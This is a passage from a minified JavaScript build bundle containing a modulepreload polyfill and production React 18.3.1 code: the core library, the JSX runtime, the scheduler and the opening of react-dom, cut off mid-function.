var F2 = (e, t) => () => (t || e((t = {
    exports: {}
}).exports, t), t.exports);
var AL = F2((IL, ga) => {
            function D2(e, t) {
                for (var n = 0; n < t.length; n++) {
                    const r = t[n];
                    if (typeof r != "string" && !Array.isArray(r)) {
                        for (const i in r)
                            if (i !== "default" && !(i in e)) {
                                const o = Object.getOwnPropertyDescriptor(r, i);
                                o && Object.defineProperty(e, i, o.get ? o : {
                                    enumerable: !0,
                                    get: () => r[i]
                                })
                            }
                    }
                }
                return Object.freeze(Object.defineProperty(e, Symbol.toStringTag, {
                    value: "Module"
                }))
            }(function() {
                const t = document.createElement("link").relList;
                if (t && t.supports && t.supports("modulepreload")) return;
                for (const i of document.querySelectorAll('link[rel="modulepreload"]')) r(i);
                new MutationObserver(i => {
                    for (const o of i)
                        if (o.type === "childList")
                            for (const s of o.addedNodes) s.tagName === "LINK" && s.rel === "modulepreload" && r(s)
                }).observe(document, {
                    childList: !0,
                    subtree: !0
                });

                function n(i) {
                    const o = {};
                    return i.integrity && (o.integrity = i.integrity), i.referrerPolicy && (o.referrerPolicy = i.referrerPolicy), i.crossOrigin === "use-credentials" ? o.credentials = "include" : i.crossOrigin === "anonymous" ? o.credentials = "omit" : o.credentials = "same-origin", o
                }

                function r(i) {
                    if (i.ep) return;
                    i.ep = !0;
                    const o = n(i);
                    fetch(i.href, o)
                }
            })();
            var va = typeof globalThis < "u" ? globalThis : typeof window < "u" ? window : typeof global < "u" ? global : typeof self < "u" ? self : {};

            function dd(e) {
                return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default") ? e.default : e
            }
            var f1 = {
                    exports: {}
                },
                fd = {},
                h1 = {
                    exports: {}
                },
                de = {};
            /**
             * @license React
             * react.production.min.js
             *
             * Copyright (c) Facebook, Inc. and its affiliates.
             *
             * This source code is licensed under the MIT license found in the
             * LICENSE file in the root directory of this source tree.
             */
            var Il = Symbol.for("react.element"),
                j2 = Symbol.for("react.portal"),
                H2 = Symbol.for("react.fragment"),
                $2 = Symbol.for("react.strict_mode"),
                U2 = Symbol.for("react.profiler"),
                z2 = Symbol.for("react.provider"),
                G2 = Symbol.for("react.context"),
                V2 = Symbol.for("react.forward_ref"),
                W2 = Symbol.for("react.suspense"),
                q2 = Symbol.for("react.memo"),
                Q2 = Symbol.for("react.lazy"),
                _g = Symbol.iterator;

            function K2(e) {
                return e === null || typeof e != "object" ? null : (e = _g && e[_g] || e["@@iterator"], typeof e == "function" ? e : null)
            }
            var p1 = {
                    isMounted: function() {
                        return !1
                    },
                    enqueueForceUpdate: function() {},
                    enqueueReplaceState: function() {},
                    enqueueSetState: function() {}
                },
                m1 = Object.assign,
                g1 = {};

            function Rs(e, t, n) {
                this.props = e, this.context = t, this.refs = g1, this.updater = n || p1
            }
            Rs.prototype.isReactComponent = {};
            Rs.prototype.setState = function(e, t) {
                if (typeof e != "object" && typeof e != "function" && e != null) throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");
                this.updater.enqueueSetState(this, e, t, "setState")
            };
            Rs.prototype.forceUpdate = function(e) {
                this.updater.enqueueForceUpdate(this, e, "forceUpdate")
            };

            function v1() {}
            v1.prototype = Rs.prototype;

            function sm(e, t, n) {
                this.props = e, this.context = t, this.refs = g1, this.updater = n || p1
            }
            var am = sm.prototype = new v1;
            am.constructor = sm;
            m1(am, Rs.prototype);
            am.isPureReactComponent = !0;
            var Sg = Array.isArray,
                y1 = Object.prototype.hasOwnProperty,
                lm = {
                    current: null
                },
                w1 = {
                    key: !0,
                    ref: !0,
                    __self: !0,
                    __source: !0
                };

            function b1(e, t, n) {
                var r, i = {},
                    o = null,
                    s = null;
                if (t != null)
                    for (r in t.ref !== void 0 && (s = t.ref), t.key !== void 0 && (o = "" + t.key), t) y1.call(t, r) && !w1.hasOwnProperty(r) && (i[r] = t[r]);
                var a = arguments.length - 2;
                if (a === 1) i.children = n;
                else if (1 < a) {
                    for (var l = Array(a), u = 0; u < a; u++) l[u] = arguments[u + 2];
                    i.children = l
                }
                if (e && e.defaultProps)
                    for (r in a = e.defaultProps, a) i[r] === void 0 && (i[r] = a[r]);
                return {
                    $$typeof: Il,
                    type: e,
                    key: o,
                    ref: s,
                    props: i,
                    _owner: lm.current
                }
            }

            function Z2(e, t) {
                return {
                    $$typeof: Il,
                    type: e.type,
                    key: t,
                    ref: e.ref,
                    props: e.props,
                    _owner: e._owner
                }
            }

            function cm(e) {
                return typeof e == "object" && e !== null && e.$$typeof === Il
            }

            function Y2(e) {
                var t = {
                    "=": "=0",
                    ":": "=2"
                };
                return "$" + e.replace(/[=:]/g, function(n) {
                    return t[n]
                })
            }
            var kg = /\/+/g;

            function pf(e, t) {
                return typeof e == "object" && e !== null && e.key != null ? Y2("" + e.key) : t.toString(36)
            }

            function yc(e, t, n, r, i) {
                var o = typeof e;
                (o === "undefined" || o === "boolean") && (e = null);
                var s = !1;
                if (e === null) s = !0;
                else switch (o) {
                    case "string":
                    case "number":
                        s = !0;
                        break;
                    case "object":
                        switch (e.$$typeof) {
                            case Il:
                            case j2:
                                s = !0
                        }
                }
                if (s) return s = e, i = i(s), e = r === "" ? "." + pf(s, 0) : r, Sg(i) ? (n = "", e != null && (n = e.replace(kg, "$&/") + "/"), yc(i, t, n, "", function(u) {
                    return u
                })) : i != null && (cm(i) && (i = Z2(i, n + (!i.key || s && s.key === i.key ? "" : ("" + i.key).replace(kg, "$&/") + "/") + e)), t.push(i)), 1;
                if (s = 0, r = r === "" ? "." : r + ":", Sg(e))
                    for (var a = 0; a < e.length; a++) {
                        o = e[a];
                        var l = r + pf(o, a);
                        s += yc(o, t, n, l, i)
                    } else if (l = K2(e), typeof l == "function")
                        for (e = l.call(e), a = 0; !(o = e.next()).done;) o = o.value, l = r + pf(o, a++), s += yc(o, t, n, l, i);
                    else if (o === "object") throw t = String(e), Error("Objects are not valid as a React child (found: " + (t === "[object Object]" ? "object with keys {" + Object.keys(e).join(", ") + "}" : t) + "). If you meant to render a collection of children, use an array instead.");
                return s
            }

            function Kl(e, t, n) {
                if (e == null) return e;
                var r = [],
                    i = 0;
                return yc(e, r, "", "", function(o) {
                    return t.call(n, o, i++)
                }), r
            }

            function J2(e) {
                if (e._status === -1) {
                    var t = e._result;
                    t = t(), t.then(function(n) {
                        (e._status === 0 || e._status === -1) && (e._status = 1, e._result = n)
                    }, function(n) {
                        (e._status === 0 || e._status === -1) && (e._status = 2, e._result = n)
                    }), e._status === -1 && (e._status = 0, e._result = t)
                }
                if (e._status === 1) return e._result.default;
                throw e._result
            }
            var It = {
                    current: null
                },
                wc = {
                    transition: null
                },
                X2 = {
                    ReactCurrentDispatcher: It,
                    ReactCurrentBatchConfig: wc,
                    ReactCurrentOwner: lm
                };

            function x1() {
                throw Error("act(...) is not supported in production builds of React.")
            }
            de.Children = {
                map: Kl,
                forEach: function(e, t, n) {
                    Kl(e, function() {
                        t.apply(this, arguments)
                    }, n)
                },
                count: function(e) {
                    var t = 0;
                    return Kl(e, function() {
                        t++
                    }), t
                },
                toArray: function(e) {
                    return Kl(e, function(t) {
                        return t
                    }) || []
                },
                only: function(e) {
                    if (!cm(e)) throw Error("React.Children.only expected to receive a single React element child.");
                    return e
                }
            };
            de.Component = Rs;
            de.Fragment = H2;
            de.Profiler = U2;
            de.PureComponent = sm;
            de.StrictMode = $2;
            de.Suspense = W2;
            de.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = X2;
            de.act = x1;
            de.cloneElement = function(e, t, n) {
                if (e == null) throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + e + ".");
                var r = m1({}, e.props),
                    i = e.key,
                    o = e.ref,
                    s = e._owner;
                if (t != null) {
                    if (t.ref !== void 0 && (o = t.ref, s = lm.current), t.key !== void 0 && (i = "" + t.key), e.type && e.type.defaultProps) var a = e.type.defaultProps;
                    for (l in t) y1.call(t, l) && !w1.hasOwnProperty(l) && (r[l] = t[l] === void 0 && a !== void 0 ? a[l] : t[l])
                }
                var l = arguments.length - 2;
                if (l === 1) r.children = n;
                else if (1 < l) {
                    a = Array(l);
                    for (var u = 0; u < l; u++) a[u] = arguments[u + 2];
                    r.children = a
                }
                return {
                    $$typeof: Il,
                    type: e.type,
                    key: i,
                    ref: o,
                    props: r,
                    _owner: s
                }
            };
            de.createContext = function(e) {
                return e = {
                    $$typeof: G2,
                    _currentValue: e,
                    _currentValue2: e,
                    _threadCount: 0,
                    Provider: null,
                    Consumer: null,
                    _defaultValue: null,
                    _globalName: null
                }, e.Provider = {
                    $$typeof: z2,
                    _context: e
                }, e.Consumer = e
            };
            de.createElement = b1;
            de.createFactory = function(e) {
                var t = b1.bind(null, e);
                return t.type = e, t
            };
            de.createRef = function() {
                return {
                    current: null
                }
            };
            de.forwardRef = function(e) {
                return {
                    $$typeof: V2,
                    render: e
                }
            };
            de.isValidElement = cm;
            de.lazy = function(e) {
                return {
                    $$typeof: Q2,
                    _payload: {
                        _status: -1,
                        _result: e
                    },
                    _init: J2
                }
            };
            de.memo = function(e, t) {
                return {
                    $$typeof: q2,
                    type: e,
                    compare: t === void 0 ? null : t
                }
            };
            de.startTransition = function(e) {
                var t = wc.transition;
                wc.transition = {};
                try {
                    e()
                } finally {
                    wc.transition = t
                }
            };
            de.unstable_act = x1;
            de.useCallback = function(e, t) {
                return It.current.useCallback(e, t)
            };
            de.useContext = function(e) {
                return It.current.useContext(e)
            };
            de.useDebugValue = function() {};
            de.useDeferredValue = function(e) {
                return It.current.useDeferredValue(e)
            };
            de.useEffect = function(e, t) {
                return It.current.useEffect(e, t)
            };
            de.useId = function() {
                return It.current.useId()
            };
            de.useImperativeHandle = function(e, t, n) {
                return It.current.useImperativeHandle(e, t, n)
            };
            de.useInsertionEffect = function(e, t) {
                return It.current.useInsertionEffect(e, t)
            };
            de.useLayoutEffect = function(e, t) {
                return It.current.useLayoutEffect(e, t)
            };
            de.useMemo = function(e, t) {
                return It.current.useMemo(e, t)
            };
            de.useReducer = function(e, t, n) {
                return It.current.useReducer(e, t, n)
            };
            de.useRef = function(e) {
                return It.current.useRef(e)
            };
            de.useState = function(e) {
                return It.current.useState(e)
            };
            de.useSyncExternalStore = function(e, t, n) {
                return It.current.useSyncExternalStore(e, t, n)
            };
            de.useTransition = function() {
                return It.current.useTransition()
            };
            de.version = "18.3.1";
            h1.exports = de;
            var b = h1.exports;
            const q = dd(b),
                mh = D2({
                    __proto__: null,
                    default: q
                }, [b]);
            /**
             * @license React
             * react-jsx-runtime.production.min.js
             *
             * Copyright (c) Facebook, Inc. and its affiliates.
             *
             * This source code is licensed under the MIT license found in the
             * LICENSE file in the root directory of this source tree.
             */
            var e_ = b,
                t_ = Symbol.for("react.element"),
                n_ = Symbol.for("react.fragment"),
                r_ = Object.prototype.hasOwnProperty,
                i_ = e_.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,
                o_ = {
                    key: !0,
                    ref: !0,
                    __self: !0,
                    __source: !0
                };

            function E1(e, t, n) {
                var r, i = {},
                    o = null,
                    s = null;
                n !== void 0 && (o = "" + n), t.key !== void 0 && (o = "" + t.key), t.ref !== void 0 && (s = t.ref);
                for (r in t) r_.call(t, r) && !o_.hasOwnProperty(r) && (i[r] = t[r]);
                if (e && e.defaultProps)
                    for (r in t = e.defaultProps, t) i[r] === void 0 && (i[r] = t[r]);
                return {
                    $$typeof: t_,
                    type: e,
                    key: o,
                    ref: s,
                    props: i,
                    _owner: i_.current
                }
            }
            fd.Fragment = n_;
            fd.jsx = E1;
            fd.jsxs = E1;
            f1.exports = fd;
            var S = f1.exports,
                gh = {},
                A1 = {
                    exports: {}
                },
                Jt = {},
                _1 = {
                    exports: {}
                },
                S1 = {};
            /**
             * @license React
             * scheduler.production.min.js
             *
             * Copyright (c) Facebook, Inc. and its affiliates.
             *
             * This source code is licensed under the MIT license found in the
             * LICENSE file in the root directory of this source tree.
             */
            (function(e) {
                function t(T, B) {
                    var R = T.length;
                    T.push(B);
                    e: for (; 0 < R;) {
                        var $ = R - 1 >>> 1,
                            Z = T[$];
                        if (0 < i(Z, B)) T[$] = B, T[R] = Z, R = $;
                        else break e
                    }
                }

                function n(T) {
                    return T.length === 0 ? null : T[0]
                }

                function r(T) {
                    if (T.length === 0) return null;
                    var B = T[0],
                        R = T.pop();
                    if (R !== B) {
                        T[0] = R;
                        e: for (var $ = 0, Z = T.length, ie = Z >>> 1; $ < ie;) {
                            var be = 2 * ($ + 1) - 1,
                                ze = T[be],
                                gt = be + 1,
                                nt = T[gt];
                            if (0 > i(ze, R)) gt < Z && 0 > i(nt, ze) ? (T[$] = nt, T[gt] = R, $ = gt) : (T[$] = ze, T[be] = R, $ = be);
                            else if (gt < Z && 0 > i(nt, R)) T[$] = nt, T[gt] = R, $ = gt;
                            else break e
                        }
                    }
                    return B
                }

                function i(T, B) {
                    var R = T.sortIndex - B.sortIndex;
                    return R !== 0 ? R : T.id - B.id
                }
                if (typeof performance == "object" && typeof performance.now == "function") {
                    var o = performance;
                    e.unstable_now = function() {
                        return o.now()
                    }
                } else {
                    var s = Date,
                        a = s.now();
                    e.unstable_now = function() {
                        return s.now() - a
                    }
                }
                var l = [],
                    u = [],
                    c = 1,
                    d = null,
                    f = 3,
                    h = !1,
                    v = !1,
                    p = !1,
                    w = typeof setTimeout == "function" ? setTimeout : null,
                    m = typeof clearTimeout == "function" ? clearTimeout : null,
                    g = typeof setImmediate < "u" ? setImmediate : null;
                typeof navigator < "u" && navigator.scheduling !== void 0 && navigator.scheduling.isInputPending !== void 0 && navigator.scheduling.isInputPending.bind(navigator.scheduling);

                function y(T) {
                    for (var B = n(u); B !== null;) {
                        if (B.callback === null) r(u);
                        else if (B.startTime <= T) r(u), B.sortIndex = B.expirationTime, t(l, B);
                        else break;
                        B = n(u)
                    }
                }

                function x(T) {
                    if (p = !1, y(T), !v)
                        if (n(l) !== null) v = !0, P(E);
                        else {
                            var B = n(u);
                            B !== null && O(x, B.startTime - T)
                        }
                }

                function E(T, B) {
                    v = !1, p && (p = !1, m(_), _ = -1), h = !0;
                    var R = f;
                    try {
                        for (y(B), d = n(l); d !== null && (!(d.expirationTime > B) || T && !M());) {
                            var $ = d.callback;
                            if (typeof $ == "function") {
                                d.callback = null, f = d.priorityLevel;
                                var Z = $(d.expirationTime <= B);
                                B = e.unstable_now(), typeof Z == "function" ? d.callback = Z : d === n(l) && r(l), y(B)
                            } else r(l);
                            d = n(l)
                        }
                        if (d !== null) var ie = !0;
                        else {
                            var be = n(u);
                            be !== null && O(x, be.startTime - B), ie = !1
                        }
                        return ie
                    } finally {
                        d = null, f = R, h = !1
                    }
                }
                var k = !1,
                    I = null,
                    _ = -1,
                    L = 5,
                    C = -1;

                function M() {
                    return !(e.unstable_now() - C < L)
                }

                function F() {
                    if (I !== null) {
                        var T = e.unstable_now();
                        C = T;
                        var B = !0;
                        try {
                            B = I(!0, T)
                        } finally {
                            B ? U() : (k = !1, I = null)
                        }
                    } else k = !1
                }
                var U;
                if (typeof g == "function") U = function() {
                    g(F)
                };
                else if (typeof MessageChannel < "u") {
                    var Q = new MessageChannel,
                        A = Q.port2;
                    Q.port1.onmessage = F, U = function() {
                        A.postMessage(null)
                    }
                } else U = function() {
                    w(F, 0)
                };

                function P(T) {
                    I = T, k || (k = !0, U())
                }

                function O(T, B) {
                    _ = w(function() {
                        T(e.unstable_now())
                    }, B)
                }
                e.unstable_IdlePriority = 5, e.unstable_ImmediatePriority = 1, e.unstable_LowPriority = 4, e.unstable_NormalPriority = 3, e.unstable_Profiling = null, e.unstable_UserBlockingPriority = 2, e.unstable_cancelCallback = function(T) {
                    T.callback = null
                }, e.unstable_continueExecution = function() {
                    v || h || (v = !0, P(E))
                }, e.unstable_forceFrameRate = function(T) {
                    0 > T || 125 < T ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : L = 0 < T ? Math.floor(1e3 / T) : 5
                }, e.unstable_getCurrentPriorityLevel = function() {
                    return f
                }, e.unstable_getFirstCallbackNode = function() {
                    return n(l)
                }, e.unstable_next = function(T) {
                    switch (f) {
                        case 1:
                        case 2:
                        case 3:
                            var B = 3;
                            break;
                        default:
                            B = f
                    }
                    var R = f;
                    f = B;
                    try {
                        return T()
                    } finally {
                        f = R
                    }
                }, e.unstable_pauseExecution = function() {}, e.unstable_requestPaint = function() {}, e.unstable_runWithPriority = function(T, B) {
                    switch (T) {
                        case 1:
                        case 2:
                        case 3:
                        case 4:
                        case 5:
                            break;
                        default:
                            T = 3
                    }
                    var R = f;
                    f = T;
                    try {
                        return B()
                    } finally {
                        f = R
                    }
                }, e.unstable_scheduleCallback = function(T, B, R) {
                    var $ = e.unstable_now();
                    switch (typeof R == "object" && R !== null ? (R = R.delay, R = typeof R == "number" && 0 < R ? $ + R : $) : R = $, T) {
                        case 1:
                            var Z = -1;
                            break;
                        case 2:
                            Z = 250;
                            break;
                        case 5:
                            Z = 1073741823;
                            break;
                        case 4:
                            Z = 1e4;
                            break;
                        default:
                            Z = 5e3
                    }
                    return Z = R + Z, T = {
                        id: c++,
                        callback: B,
                        priorityLevel: T,
                        startTime: R,
                        expirationTime: Z,
                        sortIndex: -1
                    }, R > $ ? (T.sortIndex = R, t(u, T), n(l) === null && T === n(u) && (p ? (m(_), _ = -1) : p = !0, O(x, R - $))) : (T.sortIndex = Z, t(l, T), v || h || (v = !0, P(E))), T
                }, e.unstable_shouldYield = M, e.unstable_wrapCallback = function(T) {
                    var B = f;
                    return function() {
                        var R = f;
                        f = B;
                        try {
                            return T.apply(this, arguments)
                        } finally {
                            f = R
                        }
                    }
                }
            })(S1);
            _1.exports = S1;
            var s_ = _1.exports;
            /**
             * @license React
             * react-dom.production.min.js
             *
             * Copyright (c) Facebook, Inc. and its affiliates.
             *
             * This source code is licensed under the MIT license found in the
             * LICENSE file in the root directory of this source tree.
             */
            var a_ = b,
                Kt = s_;

            function H(e) {
                for (var t = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, n = 1; n < arguments.length; n++) t += "&args[]=" + encodeURIComponent(arguments[n]);
                return "Minified React error #" + e + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
            }
            var k1 = new Set,
                Ma = {};

            function mo(e, t) {
                is(e, t), is(e + "Capture", t)
            }

            function is(e, t) {
                for (Ma[e] = t, e = 0; e < t.length; e++) k1.add(t[e])
            }
            var yr = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u"),
                vh = Object.prototype.hasOwnProperty,
                l_ = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,
                Tg = {},
                Ig = {};

            function c_(e) {
                return vh.call(Ig, e) ? !0 : vh.call(Tg, e) ? !1 : l_.test(e) ? Ig[e] = !0 : (Tg[e] = !0, !1)
            }

            function u_(e, t, n, r) {
                if (n !== null && n.type === 0) return !1;
                switch (typeof t) {
                    case "function":
                    case "symbol":
                        return !0;
                    case "boolean":
                        return r ? !1 : n !== null ? !n.acceptsBooleans : (e = e.toLowerCase().slice(0, 5), e !== "data-" && e !== "aria-");
                    default:
                        return !1
                }
            }

            function d_(e, t, n, r) {
                if (t === null || typeof t > "u" || u_(e, t, n, r)) return !0;
                if (r) return !1;
                if (n !== null) switch (n.type) {
                    case 3:
                        return !t;
                    case 4:
                        return t === !1;
                    case 5:
                        return isNaN(t);
                    case 6:
                        return isNaN(t) || 1 > t
                }
                return !1
            }

            function Ct(e, t, n, r, i, o, s) {
                this.acceptsBooleans = t === 2 || t === 3 || t === 4, this.attributeName = r, this.attributeNamespace = i, this.mustUseProperty = n, this.propertyName = e, this.type = t, this.sanitizeURL = o, this.removeEmptyString = s
            }
            var st = {};
            "children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e) {
                st[e] = new Ct(e, 0, !1, e, null, !1, !1)
            });
            [
                ["acceptCharset", "accept-charset"],
                ["className", "class"],
                ["htmlFor", "for"],
                ["httpEquiv", "http-equiv"]
            ].forEach(function(e) {
                var t = e[0];
                st[t] = new Ct(t, 1, !1, e[1], null, !1, !1)
            });
            ["contentEditable", "draggable", "spellCheck", "value"].forEach(function(e) {
                st[e] = new Ct(e, 2, !1, e.toLowerCase(), null, !1, !1)
            });
            ["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function(e) {
                st[e] = new Ct(e, 2, !1, e, null, !1, !1)
            });
            "allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e) {
                st[e] = new Ct(e, 3, !1, e.toLowerCase(), null, !1, !1)
            });
            ["checked", "multiple", "muted", "selected"].forEach(function(e) {
                st[e] = new Ct(e, 3, !0, e, null, !1, !1)
            });
            ["capture", "download"].forEach(function(e) {
                st[e] = new Ct(e, 4, !1, e, null, !1, !1)
            });
            ["cols", "rows", "size", "span"].forEach(function(e) {
                st[e] = new Ct(e, 6, !1, e, null, !1, !1)
            });
            ["rowSpan", "start"].forEach(function(e) {
                st[e] = new Ct(e, 5, !1, e.toLowerCase(), null, !1, !1)
            });
            var um = /[\-:]([a-z])/g;

            function dm(e) {
                return e[1].toUpperCase()
            }
            "accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e) {
                var t = e.replace(um, dm);
                st[t] = new Ct(t, 1, !1, e, null, !1, !1)
            });
            "xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e) {
                var t = e.replace(um, dm);
                st[t] = new Ct(t, 1, !1, e, "http://www.w3.org/1999/xlink", !1, !1)
            });
            ["xml:base", "xml:lang", "xml:space"].forEach(function(e) {
                var t = e.replace(um, dm);
                st[t] = new Ct(t, 1, !1, e, "http://www.w3.org/XML/1998/namespace", !1, !1)
            });
            ["tabIndex", "crossOrigin"].forEach(function(e) {
                st[e] = new Ct(e, 1, !1, e.toLowerCase(), null, !1, !1)
            });
            st.xlinkHref = new Ct("xlinkHref", 1, !1, "xlink:href", "http://www.w3.org/1999/xlink", !0, !1);
            ["src", "href", "action", "formAction"].forEach(function(e) {
                st[e] = new Ct(e, 1, !1, e.toLowerCase(), null, !0, !0)
            });

            function fm(e, t, n, r) {
                var i = st.hasOwnProperty(t) ? st[t] : null;
                (i !== null ? i.type !== 0 : r || !(2 < t.length) || t[0] !== "o" && t[0] !== "O" || t[1] !== "n" && t[1] !== "N") && (d_(t, n, i, r) && (n = null), r || i === null ? c_(t) && (n === null ? e.removeAttribute(t) : e.setAttribute(t, "" + n)) : i.mustUseProperty ? e[i.propertyName] = n === null ? i.type === 3 ? !1 : "" : n : (t = i.attributeName, r = i.attributeNamespace, n === null ? e.removeAttribute(t) : (i = i.type, n = i === 3 || i === 4 && n === !0 ? "" : "" + n, r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))))
            }
            var kr = a_.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,
                Zl = Symbol.for("react.element"),
                No = Symbol.for("react.portal"),
                Bo = Symbol.for("react.fragment"),
                hm = Symbol.for("react.strict_mode"),
                yh = Symbol.for("react.profiler"),
                T1 = Symbol.for("react.provider"),
                I1 = Symbol.for("react.context"),
                pm = Symbol.for("react.forward_ref"),
                wh = Symbol.for("react.suspense"),
                bh = Symbol.for("react.suspense_list"),
                mm = Symbol.for("react.memo"),
                Or = Symbol.for("react.lazy"),
                C1 = Symbol.for("react.offscreen"),
                Cg = Symbol.iterator;

            function qs(e) {
                return e === null || typeof e != "object" ? null : (e = Cg && e[Cg] || e["@@iterator"], typeof e == "function" ? e : null)
            }
            var Fe = Object.assign,
                mf;

            function aa(e) {
                if (mf === void 0) try {
                    throw Error()
                } catch (n) {
                    var t = n.stack.trim().match(/\n( *(at )?)/);
                    mf = t && t[1] || ""
                }
                return `
` + mf + e
            }
            var gf = !1;

            function vf(e, t) {
                if (!e || gf) return "";
                gf = !0;
                var n = Error.prepareStackTrace;
                Error.prepareStackTrace = void 0;
                try {
                    if (t)
                        if (t = function() {
                                throw Error()
                            }, Object.defineProperty(t.prototype, "props", {
                                set: function() {
                                    throw Error()
                                }
                            }), typeof Reflect == "object" && Reflect.construct) {
                            try {
                                Reflect.construct(t, [])
                            } catch (u) {
                                var r = u
                            }
                            Reflect.construct(e, [], t)
                        } else {
                            try {
                                t.call()
                            } catch (u) {
                                r = u
                            }
                            e.call(t.prototype)
                        }
                    else {
                        try {
                            throw Error()
                        } catch (u) {
                            r = u
                        }
                        e()
                    }
                } catch (u) {
                    if (u && r && typeof u.stack == "string") {
                        for (var i = u.stack.split(`
`), o = r.stack.split(`
`), s = i.length - 1, a = o.length - 1; 1 <= s && 0 <= a && i[s] !== o[a];) a--;
                        for (; 1 <= s && 0 <= a; s--, a--)
                            if (i[s] !== o[a]) {
                                if (s !== 1 || a !== 1)
                                    do
                                        if (s--, a--, 0 > a || i[s] !== o[a]) {
                                            var l = `
` + i[s].replace(" at new ", " at ");
                                            return e.displayName && l.includes("<anonymous>") && (l = l.replace("<anonymous>", e.displayName)), l
                                        }
                                while (1 <= s && 0 <= a);
                                break
                            }
                    }
                } finally {
                    gf = !1, Error.prepareStackTrace = n
                }
                return (e = e ? e.displayName || e.name : "") ? aa(e) : ""
            }

            function f_(e) {
                switch (e.tag) {
                    case 5:
                        return aa(e.type);
                    case 16:
                        return aa("Lazy");
                    case 13:
                        return aa("Suspense");
                    case 19:
                        return aa("SuspenseList");
                    case 0:
                    case 2:
                    case 15:
                        return e = vf(e.type, !1), e;
                    case 11:
                        return e = vf(e.type.render, !1), e;
                    case 1:
                        return e = vf(e.type, !0), e;
                    default:
                        return ""
                }
            }

            function xh(e) {
                if (e == null) return null;
                if (typeof e == "function") return e.displayName || e.name || null;
                if (typeof e == "string") return e;
                switch (e) {
                    case Bo:
                        return "Fragment";
                    case No:
                        return "Portal";
                    case yh:
                        return "Profiler";
                    case hm:
                        return "StrictMode";
                    case wh:
                        return "Suspense";
                    case bh:
                        return "SuspenseList"
                }
                if (typeof e == "object") switch (e.$$typeof) {
                    case I1:
                        return (e.displayName || "Context") + ".Consumer";
                    case T1:
                        return (e._context.displayName || "Context") + ".Provider";
                    case pm:
                        var t = e.render;
                        return e = e.displayName, e || (e = t.displayName || t.name || "", e = e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef"), e;
                    case mm:
                        return t = e.displayName || null, t !== null ? t : xh(e.type) || "Memo";
                    case Or:
                        t = e._payload, e = e._init;
                        try {
                            return xh(e(t))
                        } catch {}
                }
                return null
            }

            function h_(e) {
                var t = e.type;
                switch (e.tag) {
                    case 24:
                        return "Cache";
                    case 9:
                        return (t.displayName || "Context") + ".Consumer";
                    case 10:
                        return (t._context.displayName || "Context") + ".Provider";
                    case 18:
                        return "DehydratedFragment";
                    case 11:
                        return e = t.render, e = e.displayName || e.name || "", t.displayName || (e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef");
                    case 7:
                        return "Fragment";
                    case 5:
                        return t;
                    case 4:
                        return "Portal";
                    case 3:
                        return "Root";
                    case 6:
                        return "Text";
                    case 16:
                        return xh(t);
                    case 8:
                        return t === hm ? "StrictMode" : "Mode";
                    case 22:
                        return "Offscreen";
                    case 12:
                        return "Profiler";
                    case 21:
                        return "Scope";
                    case 13:
                        return "Suspense";
                    case 19:
                        return "SuspenseList";
                    case 25:
                        return "TracingMarker";
                    case 1:
                    case 0:
                    case 17:
                    case 2:
                    case 14:
                    case 15:
                        if (typeof t == "function") return t.displayName || t.name || null;
                        if (typeof t == "string") return t
                }
                return null
            }

            function ni(e) {
                switch (typeof e) {
                    case "boolean":
                    case "number":
                    case "string":
                    case "undefined":
                        return e;
                    case "object":
                        return e;
                    default:
                        return ""
                }
            }

            function P1(e) {
                var t = e.type;
                return (e = e.nodeName) && e.toLowerCase() === "input" && (t === "checkbox" || t === "radio")
            }

            function p_(e) {
                var t = P1(e) ? "checked" : "value",
                    n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t),
                    r = "" + e[t];
                if (!e.hasOwnProperty(t) && typeof n < "u" && typeof n.get == "function" && typeof n.set == "function") {
                    var i = n.get,
                        o = n.set;
                    return Object.defineProperty(e, t, {
                        configurable: !0,
                        get: function() {
                            return i.call(this)
                        },
                        set: function(s) {
                            r = "" + s, o.call(this, s)
